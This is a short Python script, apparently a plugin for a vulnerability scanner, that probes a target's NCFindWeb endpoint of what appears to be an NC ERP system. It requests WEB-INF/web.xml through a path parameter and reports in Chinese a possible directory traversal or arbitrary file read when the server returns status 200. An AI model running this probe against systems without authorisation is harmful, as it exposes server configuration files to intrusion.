import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from lib.Urldeal import umethod
from lib import *
import logging



def nc_erp_directory(Url):
    scheme, url, port = umethod(Url)
    urldata = scheme + "://" + url + ':' + str(port) + '/'
    url = urldata + '/NCFindWeb?service=IPreAlertConfigService&filename=WEB-INF/web.xml'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.360'
    }
    try:
        requests.packages.urllib3.disable_warnings()
        response = requests.get(url=url, headers=headers, timeout=30)
        if response.status_code == 200:
            print(Vcolors.RED + "[+] 该系统可能存在目录遍历和任意文件读取漏洞，具体URL为{}".format(url)+ Vcolors.ENDC)
            return url
        else:
            print(Vcolors.WARNING +"[+] 该系统不存在目录遍历和任意文件读取" +Vcolors.ENDC)
    except:
        logging.error("nc_erp_directory脚本出现异常")




